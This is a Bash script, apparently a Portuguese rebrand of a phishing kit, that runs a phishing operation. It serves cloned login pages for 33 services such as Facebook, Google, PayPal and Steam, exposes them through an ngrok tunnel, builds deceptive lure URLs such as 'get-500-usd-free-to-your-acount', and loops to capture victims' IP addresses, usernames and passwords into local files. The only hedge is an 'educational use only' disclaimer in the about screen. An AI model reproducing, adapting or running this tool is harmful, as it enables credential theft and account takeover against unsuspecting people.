## ANSI colors (FG & BG)
RED="$(printf '\033[31m')"  GREEN="$(printf '\033[32m')"  ORANGE="$(printf '\033[33m')"  BLUE="$(printf '\033[34m')"
MAGENTA="$(printf '\033[35m')"  CYAN="$(printf '\033[36m')"  WHITE="$(printf '\033[37m')" BLACK="$(printf '\033[30m')"
REDBG="$(printf '\033[41m')"  GREENBG="$(printf '\033[42m')"  ORANGEBG="$(printf '\033[43m')"  BLUEBG="$(printf '\033[44m')"
MAGENTABG="$(printf '\033[45m')"  CYANBG="$(printf '\033[46m')"  WHITEBG="$(printf '\033[47m')" BLACKBG="$(printf '\033[40m')"
RESETBG="$(printf '\e[0m\n')"

## Directories
if [[ ! -d ".server" ]]; then
        mkdir -p ".server"
fi
if [[ -d ".server/www" ]]; then
        rm -rf ".server/www"
        mkdir -p ".server/www"
else
        mkdir -p ".server/www"
fi

## Script termination
exit_on_signal_SIGINT() {
    { printf "\n\n%s\n\n" "${RED}[${WHITE}!${RED}]${RED} Programa Interrompido." 2>&1; reset_color; }
    exit 0
}

exit_on_signal_SIGTERM() {
    { printf "\n\n%s\n\n" "${RED}[${WHITE}!${RED}]${RED} Programa Interrompido." 2>&1; reset_color; }
    exit 0
}

trap exit_on_signal_SIGINT SIGINT
trap exit_on_signal_SIGTERM SIGTERM

## Reset terminal colors
reset_color() {
        tput sgr0   # reset attributes
        tput op     # reset color
    return
}

## Kill already running process
kill_pid() {
        if [[ `pidof php` ]]; then
                killall php > /dev/null 2>&1
        fi
        if [[ `pidof ngrok` ]]; then
                killall ngrok > /dev/null 2>&1
        fi
}

## Banner
banner() {

        cat <<-EOF

${ORANGE} .d8888b.  888               888 888 8888888b.  888      d8b          888      
${ORANGE}d88P  Y88b 888               888 888 888   Y88b 888      Y8P          888      
${ORANGE}Y88b.      888               888 888 888    888 888                   888      
${ORANGE} "Y888b.   88888b.   .d88b.  888 888 888   d88P 88888b.  888 .d8888b  88888b.  
${ORANGE}    "Y88b. 888 "88b d8P  Y8b 888 888 8888888P"  888 "88b 888 88K      888 "88b 
${ORANGE}      "888 888  888 88888888 888 888 888        888  888 888 "Y8888b. 888  888 
${ORANGE}Y88b  d88P 8O8  8B8 Y8b.     8R8 8I8 8G8        8A8  8D8 8O8      XP8 8O8  8R8 
${ORANGE} "Y8U88P"  8S8  8A8  "Y8R88  8T8 8M8 8J8        8G8  8A8 8L8  88E88P' 8R8  8A8
${ORANGE}                                                            ${RED}Versão : 1.0

                ${GREEN}[${WHITE}-${GREEN}]${CYAN} Criado por Flávio Costa${WHITE}
        EOF
}

## Small Banner
banner_small() {
        cat <<-EOF
${BLUE} ,-.  .       . . ;-.  .         .   
${BLUE}(   ` |       | | |  ) |   o     |   
${BLUE} `-.  |-. ,-. | | |-'  |-. . ,-. |-. 
${BLUE}.   ) | | |-' | | |    | | | `-. | | 
${BLUE} `-'  ' ' `-' ' ' '    ' ' ' `-' ' ' 
                               ${WHITE} 1.0
        EOF
}

## Dependencies
dependencies() {
        echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} iNsTaLaNdO oS pAcOtEs NeCeSsArIoS..."

    if [[ -d "/data/data/com.termux/files/home" ]]; then
        if [[ `command -v proot` ]]; then
            printf ''
        else
                        echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Instalando o pacote : ${ORANGE}proot${CYAN}"${WHITE}
            pkg install proot resolv-conf -y
        fi
    fi

        if [[ `command -v php` && `command -v wget` && `command -v curl` && `command -v unzip` ]]; then
                echo -e "\n${GREEN}[${WHITE}+${GREEN}]${GREEN} Pacotes já instalados."
        else
                pkgs=(php curl wget unzip)
                for pkg in "${pkgs[@]}"; do
                        type -p "$pkg" &>/dev/null || {
                                echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Instalando o pacote : ${ORANGE}$pkg${CYAN}"${WHITE}
                                if [[ `command -v pkg` ]]; then
                                        pkg install "$pkg" -y
                                elif [[ `command -v apt` ]]; then
                                        apt install "$pkg" -y
                                elif [[ `command -v apt-get` ]]; then
                                        apt-get install "$pkg" -y
                                elif [[ `command -v pacman` ]]; then
                                        sudo pacman -S "$pkg" --noconfirm
                                elif [[ `command -v dnf` ]]; then
                                        sudo dnf -y install "$pkg"
                                else
                                        echo -e "\n${RED}[${WHITE}!${RED}]${RED} Gerenciador de pacotes nao suportado, instalar pacotes manualmente."
                                        { reset_color; exit 1; }
                                fi
                        }
                done
        fi

}

## Download Ngrok
download_ngrok() {
        url="$1"
        file=`basename $url`
        if [[ -e "$file" ]]; then
                rm -rf "$file"
        fi
        wget --no-check-certificate "$url" > /dev/null 2>&1
        if [[ -e "$file" ]]; then
                unzip "$file" > /dev/null 2>&1
                mv -f ngrok .server/ngrok > /dev/null 2>&1
                rm -rf "$file" > /dev/null 2>&1
                chmod +x .server/ngrok > /dev/null 2>&1
        else
                echo -e "\n${RED}[${WHITE}!${RED}]${RED} Ops, deu pau! Instale o Ngrok manualmente."
                { reset_color; exit 1; }
        fi
}

## Install ngrok
install_ngrok() {
        if [[ -e ".server/ngrok" ]]; then
                echo -e "\n${GREEN}[${WHITE}+${GREEN}]${GREEN} Ngrok já instaldo ;-)."
        else
                echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Instalando o Ngrok..."${WHITE}
                arch=`uname -m`
                if [[ ("$arch" == *'arm'*) || ("$arch" == *'Android'*) ]]; then
                        download_ngrok 'https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip'
                elif [[ "$arch" == *'aarch64'* ]]; then
                        download_ngrok 'https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm64.zip'
                elif [[ "$arch" == *'x86_64'* ]]; then
                        download_ngrok 'https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-amd64.zip'
                else
                        download_ngrok 'https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-386.zip'
                fi
        fi

}

## Exit message
msg_exit() {
        { clear; banner; echo; }
        echo -e "${GREENBG}${BLACK} Obrigado por utilizar essa ferramenta, até breve.${RESETBG}\n"
        { reset_color; exit 0; }
}

## About
about() {
        { clear; banner; echo; }
        cat <<-EOF
                ${GREEN}Author   ${RED}:  ${ORANGE}TAHMID RAYAT ${RED}[ ${ORANGE}Flávio Costa ${RED}]
                ${GREEN}Github   ${RED}:  ${CYAN}https://github.com/htr-tech
                ${GREEN}Social   ${RED}:  ${CYAN}https://linktr.ee/tahmid.rayat
                ${GREEN}Version  ${RED}:  ${ORANGE}1.0

                ${REDBG}${WHITE} Ferramenta única e exclusivamente para uso educacional
                                                                  Não sou responsável por sua utlização ${RESETBG}

                ${RED}[${WHITE}00${RED}]${ORANGE} Menu Principal    ${RED}[${WHITE}99${RED}]${ORANGE} Sair

        EOF

        read -p "${RED}[${WHITE}-${RED}]${GREEN} Selecione uma opção : ${BLUE}"

        if [[ "$REPLY" == 99 ]]; then
                msg_exit
        elif [[ "$REPLY" == 0 || "$REPLY" == 00 ]]; then
                echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Retornando ao menu inicial..."
                { sleep 1; main_menu; }
        else
                echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Opção inválida, tente novamente..."
                { sleep 1; about; }
        fi
}

## Setup website and start php server
HOST='127.0.0.1'
PORT='8080'

setup_site() {
        echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} Preparando o servidor..."${WHITE}
        cp -rf .sites/"$website"/* .server/www
        cp -f .sites/ip.php .server/www/
        echo -ne "\n${RED}[${WHITE}-${RED}]${BLUE} Iniciando servidor PHP..."${WHITE}
        cd .server/www && php -S "$HOST":"$PORT" > /dev/null 2>&1 &
}

## Get IP address
capture_ip() {
        IP=$(grep -a 'IP:' .server/www/ip.txt | cut -d " " -f2 | tr -d '\r')
        IFS=$'\n'
        echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} IP da Vítima : ${BLUE}$IP"
        echo -ne "\n${RED}[${WHITE}-${RED}]${BLUE} Salvo em : ${ORANGE}ip.txt"
        cat .server/www/ip.txt >> ip.txt
}

## Get credentials
capture_creds() {
        ACCOUNT=$(grep -o 'Username:.*' .server/www/usernames.txt | cut -d " " -f2)
        PASSWORD=$(grep -o 'Pass:.*' .server/www/usernames.txt | cut -d ":" -f2)
        IFS=$'\n'
        echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Conta : ${BLUE}$ACCOUNT"
        echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Senha : ${BLUE}$PASSWORD"
        echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} Salvo em : ${ORANGE}usernames.dat"
        cat .server/www/usernames.txt >> usernames.dat
        echo -ne "\n${RED}[${WHITE}-${RED}]${ORANGE} Aguardando a próxima informação de login, ${BLUE}Ctrl + C ${ORANGE}para sair. "
}

## Print data
capture_data() {
        echo -ne "\n${RED}[${WHITE}-${RED}]${ORANGE} Aguardando a próxima informação de login, ${BLUE}Ctrl + C ${ORANGE}para sair..."
        while true; do
                if [[ -e ".server/www/ip.txt" ]]; then
                        echo -e "\n\n${RED}[${WHITE}-${RED}]${GREEN} IP da vítima encontrado !"
                        capture_ip
                        rm -rf .server/www/ip.txt
                fi
                sleep 0.75
                if [[ -e ".server/www/usernames.txt" ]]; then
                        echo -e "\n\n${RED}[${WHITE}-${RED}]${GREEN} Informações de login encontradas !!"
                        capture_creds
                        rm -rf .server/www/usernames.txt
                fi
                sleep 0.75
        done
}

## Start ngrok
start_ngrok() {
        echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Inicializando... ${GREEN}( ${CYAN}http://$HOST:$PORT ${GREEN})"
        { sleep 1; setup_site; }
        echo -ne "\n\n${RED}[${WHITE}-${RED}]${GREEN} Iniciando Ngrok..."

    if [[ `command -v termux-chroot` ]]; then
        sleep 2 && termux-chroot ./.server/ngrok http "$HOST":"$PORT" > /dev/null 2>&1 & # YouTube.com/FlavioCostaSegurancaDescomplicada
    else
        sleep 2 && ./.server/ngrok http "$HOST":"$PORT" > /dev/null 2>&1 &
    fi

        { sleep 8; clear; banner_small; }
        ngrok_url=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
        ngrok_url1=${ngrok_url#https://}
        echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} URL 1 : ${GREEN}$ngrok_url"
        echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} URL 2 : ${GREEN}$mask@$ngrok_url1"
        capture_data
}

## Start localhost
start_localhost() {
        echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Inicializando... ${GREEN}( ${CYAN}http://$HOST:$PORT ${GREEN})"
        setup_site
        { sleep 1; clear; banner_small; }
        echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Hospedado com sucesso em : ${GREEN}${CYAN}http://$HOST:$PORT ${GREEN}"
        capture_data
}

## Tunnel selection
tunnel_menu() {
        { clear; banner_small; }
        cat <<-EOF

                ${RED}[${WHITE}01${RED}]${ORANGE} Localhost ${RED}[${CYAN}For Devs${RED}]
                ${RED}[${WHITE}02${RED}]${ORANGE} Ngrok.io  ${RED}[${CYAN}Best${RED}]

        EOF

        read -p "${RED}[${WHITE}-${RED}]${GREEN} Selecione um serviço de encaminhamento de porta : ${BLUE}"

        if [[ "$REPLY" == 1 || "$REPLY" == 01 ]]; then
                start_localhost
        elif [[ "$REPLY" == 2 || "$REPLY" == 02 ]]; then
                start_ngrok
        else
                echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Opção inválida, tente novamente..."
                { sleep 1; tunnel_menu; }
        fi
}

## Facebook
site_facebook() {
        cat <<-EOF

                ${RED}[${WHITE}01${RED}]${ORANGE} Página de login tradicional
                ${RED}[${WHITE}02${RED}]${ORANGE} Pàgina de login da votação avançada
                ${RED}[${WHITE}03${RED}]${ORANGE} Página de login de segurança falsa
                ${RED}[${WHITE}04${RED}]${ORANGE} Página de login do Facebook Messenger

        EOF

        read -p "${RED}[${WHITE}-${RED}]${GREEN} Selecione uma opção : ${BLUE}"

        if [[ "$REPLY" == 1 || "$REPLY" == 01 ]]; then
                website="facebook"
                mask='http://blue-verified-badge-for-facebook-free'
                tunnel_menu
        elif [[ "$REPLY" == 2 || "$REPLY" == 02 ]]; then
                website="fb_advanced"
                mask='http://vote-for-the-best-social-media'
                tunnel_menu
        elif [[ "$REPLY" == 3 || "$REPLY" == 03 ]]; then
                website="fb_security"
                mask='http://make-your-facebook-secured-and-free-from-hackers'
                tunnel_menu
        elif [[ "$REPLY" == 4 || "$REPLY" == 04 ]]; then
                website="fb_messenger"
                mask='http://get-messenger-premium-features-free'
                tunnel_menu
        else
                echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Opção inválida chefe, tente novamente..."
                { sleep 1; clear; banner_small; site_facebook; }
        fi
}

## Instagram
site_instagram() {
        cat <<-EOF

                ${RED}[${WHITE}01${RED}]${ORANGE} Página de login tradicional
                ${RED}[${WHITE}02${RED}]${ORANGE} Página de login de seguidores automáticos
                ${RED}[${WHITE}03${RED}]${ORANGE} Página de login de 1000 seguidores
                ${RED}[${WHITE}04${RED}]${ORANGE} Página de login de verificação blue badge

        EOF

        read -p "${RED}[${WHITE}-${RED}]${GREEN} Selecione uma opção: ${BLUE}"

        if [[ "$REPLY" == 1 || "$REPLY" == 01 ]]; then
                website="instagram"
                mask='http://get-unlimited-followers-for-instagram'
                tunnel_menu
        elif [[ "$REPLY" == 2 || "$REPLY" == 02 ]]; then
                website="ig_followers"
                mask='http://get-unlimited-followers-for-instagram'
                tunnel_menu
        elif [[ "$REPLY" == 3 || "$REPLY" == 03 ]]; then
                website="insta_followers"
                mask='http://get-1000-followers-for-instagram'
                tunnel_menu
        elif [[ "$REPLY" == 4 || "$REPLY" == 04 ]]; then
                website="ig_verify"
                mask='http://blue-badge-verify-for-instagram-free'
                tunnel_menu
        else
                echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Opção inválida meu consagrado, tente novamente..."
                { sleep 1; clear; banner_small; site_instagram; }
        fi
}

## Gmail/Google
site_gmail() {
        cat <<-EOF

                ${RED}[${WHITE}01${RED}]${ORANGE} Página de login do Gmail antigona
                ${RED}[${WHITE}02${RED}]${ORANGE} Página de login do Gmail nova
                ${RED}[${WHITE}03${RED}]${ORANGE} Página de login de Votação avançada

        EOF

        read -p "${RED}[${WHITE}-${RED}]${GREEN} Escolhe aí : ${BLUE}"

        if [[ "$REPLY" == 1 || "$REPLY" == 01 ]]; then
                website="google"
                mask='http://get-unlimited-google-drive-free'
                tunnel_menu
        elif [[ "$REPLY" == 2 || "$REPLY" == 02 ]]; then
                website="google_new"
                mask='http://get-unlimited-google-drive-free'
                tunnel_menu
        elif [[ "$REPLY" == 3 || "$REPLY" == 03 ]]; then
                website="google_poll"
                mask='http://vote-for-the-best-social-media'
                tunnel_menu
        else
                echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Opção inválida parceiro, Try Again..."
                { sleep 1; clear; banner_small; site_gmail; }
        fi
}

## Vk
site_vk() {
        cat <<-EOF

                ${RED}[${WHITE}01${RED}]${ORANGE} Página de login tradicional
                ${RED}[${WHITE}02${RED}]${ORANGE} Página de login de Votação avançada

        EOF

        read -p "${RED}[${WHITE}-${RED}]${GREEN} Escolhe aí brother : ${BLUE}"

        if [[ "$REPLY" == 1 || "$REPLY" == 01 ]]; then
                website="vk"
                mask='http://vk-premium-real-method-2020'
                tunnel_menu
        elif [[ "$REPLY" == 2 || "$REPLY" == 02 ]]; then
                website="vk_poll"
                mask='http://vote-for-the-best-social-media'
                tunnel_menu
        else
                echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Opção inválida parça, Try Again..."
                { sleep 1; clear; banner_small; site_vk; }
        fi
}

## Menu
main_menu() {
        { clear; banner; echo; }
        cat <<-EOF
                ${RED}[${WHITE}::${RED}]${ORANGE} "Pick up your weapons and fight! Vamos de quê hoje?" ${RED}[${WHITE}::${RED}]${ORANGE}

                ${RED}[${WHITE}01${RED}]${ORANGE} Facebook      ${RED}[${WHITE}11${RED}]${ORANGE} Twitch       ${RED}[${WHITE}21${RED}]${ORANGE} DeviantArt
                ${RED}[${WHITE}02${RED}]${ORANGE} Instagram     ${RED}[${WHITE}12${RED}]${ORANGE} Pinterest    ${RED}[${WHITE}22${RED}]${ORANGE} Badoo
                ${RED}[${WHITE}03${RED}]${ORANGE} Google        ${RED}[${WHITE}13${RED}]${ORANGE} Snapchat     ${RED}[${WHITE}23${RED}]${ORANGE} Origin
                ${RED}[${WHITE}04${RED}]${ORANGE} Microsoft     ${RED}[${WHITE}14${RED}]${ORANGE} Linkedin     ${RED}[${WHITE}24${RED}]${ORANGE} DropBox
                ${RED}[${WHITE}05${RED}]${ORANGE} Netflix       ${RED}[${WHITE}15${RED}]${ORANGE} Ebay         ${RED}[${WHITE}25${RED}]${ORANGE} Yahoo
                ${RED}[${WHITE}06${RED}]${ORANGE} Paypal        ${RED}[${WHITE}16${RED}]${ORANGE} Quora        ${RED}[${WHITE}26${RED}]${ORANGE} Wordpress
                ${RED}[${WHITE}07${RED}]${ORANGE} Steam         ${RED}[${WHITE}17${RED}]${ORANGE} Protonmail   ${RED}[${WHITE}27${RED}]${ORANGE} Yandex
                ${RED}[${WHITE}08${RED}]${ORANGE} Twitter       ${RED}[${WHITE}18${RED}]${ORANGE} Spotify      ${RED}[${WHITE}28${RED}]${ORANGE} StackoverFlow
                ${RED}[${WHITE}09${RED}]${ORANGE} Playstation   ${RED}[${WHITE}19${RED}]${ORANGE} Reddit       ${RED}[${WHITE}29${RED}]${ORANGE} Vk
                ${RED}[${WHITE}10${RED}]${ORANGE} Tiktok        ${RED}[${WHITE}20${RED}]${ORANGE} Adobe        ${RED}[${WHITE}30${RED}]${ORANGE} XBOX
                ${RED}[${WHITE}31${RED}]${ORANGE} Mediafire     ${RED}[${WHITE}32${RED}]${ORANGE} GitLab       ${RED}[${WHITE}33${RED}]${ORANGE} GitHub

                ${RED}[${WHITE}99${RED}]${ORANGE} Sobre         ${RED}[${WHITE}00${RED}]${ORANGE} Sair

        EOF

        read -p "${RED}[${WHITE}-${RED}]${GREEN} Selecione uma opção : ${BLUE}"

        if [[ "$REPLY" == 1 || "$REPLY" == 01 ]]; then
                site_facebook
        elif [[ "$REPLY" == 2 || "$REPLY" == 02 ]]; then
                site_instagram
        elif [[ "$REPLY" == 3 || "$REPLY" == 03 ]]; then
                site_gmail
        elif [[ "$REPLY" == 4 || "$REPLY" == 04 ]]; then
                website="microsoft"
                mask='http://unlimited-onedrive-space-for-free'
                tunnel_menu
        elif [[ "$REPLY" == 5 || "$REPLY" == 05 ]]; then
                website="netflix"
                mask='http://upgrade-your-netflix-plan-free'
                tunnel_menu
        elif [[ "$REPLY" == 6 || "$REPLY" == 06 ]]; then
                website="paypal"
                mask='http://get-500-usd-free-to-your-acount'
                tunnel_menu
        elif [[ "$REPLY" == 7 || "$REPLY" == 07 ]]; then
                website="steam"
                mask='http://steam-500-usd-gift-card-free'
                tunnel_menu
        elif [[ "$REPLY" == 8 || "$REPLY" == 08 ]]; then
                website="twitter"
                mask='http://get-blue-badge-on-twitter-free'
                tunnel_menu
        elif [[ "$REPLY" == 9 || "$REPLY" == 09 ]]; then
                website="playstation"
                mask='http://playstation-500-usd-gift-card-free'
                tunnel_menu
        elif [[ "$REPLY" == 10 ]]; then
                website="tiktok"
                mask='http://tiktok-free-liker'
                tunnel_menu
        elif [[ "$REPLY" == 11 ]]; then
                website="twitch"
                mask='http://unlimited-twitch-tv-user-for-free'
                tunnel_menu
        elif [[ "$REPLY" == 12 ]]; then
                website="pinterest"
                mask='http://get-a-premium-plan-for-pinterest-free'
                tunnel_menu
        elif [[ "$REPLY" == 13 ]]; then
                website="snapchat"
                mask='http://view-locked-snapchat-accounts-secretly'
                tunnel_menu
        elif [[ "$REPLY" == 14 ]]; then
                website="linkedin"
                mask='http://get-a-premium-plan-for-linkedin-free'
                tunnel_menu
        elif [[ "$REPLY" == 15 ]]; then
                website="ebay"
                mask='http://get-500-usd-free-to-your-acount'
                tunnel_menu
        elif [[ "$REPLY" == 16 ]]; then
                website="quora"
                mask='http://quora-premium-for-free'
                tunnel_menu
        elif [[ "$REPLY" == 17 ]]; then
                website="protonmail"
                mask='http://protonmail-pro-basics-for-free'
                tunnel_menu
        elif [[ "$REPLY" == 18 ]]; then
                website="spotify"
                mask='http://convert-your-account-to-spotify-premium'
                tunnel_menu
        elif [[ "$REPLY" == 19 ]]; then
                website="reddit"
                mask='http://reddit-official-verified-member-badge'
                tunnel_menu
        elif [[ "$REPLY" == 20 ]]; then
                website="adobe"
                mask='http://get-adobe-lifetime-pro-membership-free'
                tunnel_menu
        elif [[ "$REPLY" == 21 ]]; then
                website="deviantart"
                mask='http://get-500-usd-free-to-your-acount'
                tunnel_menu
        elif [[ "$REPLY" == 22 ]]; then
                website="badoo"
                mask='http://get-500-usd-free-to-your-acount'
                tunnel_menu
        elif [[ "$REPLY" == 23 ]]; then
                website="origin"
                mask='http://get-500-usd-free-to-your-acount'
                tunnel_menu
        elif [[ "$REPLY" == 24 ]]; then
                website="dropbox"
                mask='http://get-1TB-cloud-storage-free'
                tunnel_menu
        elif [[ "$REPLY" == 25 ]]; then
                website="yahoo"
                mask='http://grab-mail-from-anyother-yahoo-account-free'
                tunnel_menu
        elif [[ "$REPLY" == 26 ]]; then
                website="wordpress"
                mask='http://unlimited-wordpress-traffic-free'
                tunnel_menu
        elif [[ "$REPLY" == 27 ]]; then
                website="yandex"
                mask='http://grab-mail-from-anyother-yandex-account-free'
                tunnel_menu
        elif [[ "$REPLY" == 28 ]]; then
                website="stackoverflow"
                mask='http://get-stackoverflow-lifetime-pro-membership-free'
                tunnel_menu
        elif [[ "$REPLY" == 29 ]]; then
                site_vk
        elif [[ "$REPLY" == 30 ]]; then
                website="xbox"
                mask='http://get-500-usd-free-to-your-acount'
                tunnel_menu
        elif [[ "$REPLY" == 31 ]]; then
                website="mediafire"
                mask='http://get-1TB-on-mediafire-free'
                tunnel_menu
        elif [[ "$REPLY" == 32 ]]; then
                website="gitlab"
                mask='http://get-1k-followers-on-gitlab-free'
                tunnel_menu
        elif [[ "$REPLY" == 33 ]]; then
                website="github"
                mask='http://get-1k-followers-on-github-free'
                tunnel_menu
        elif [[ "$REPLY" == 99 ]]; then
                about
        elif [[ "$REPLY" == 0 || "$REPLY" == 00 ]]; then
                msg_exit
        else
                echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Que escolha é essa? Não tem isso não meu querido..."
                { sleep 1; main_menu; }
        fi
}

## Main
kill_pid
dependencies
install_ngrok
main_menu
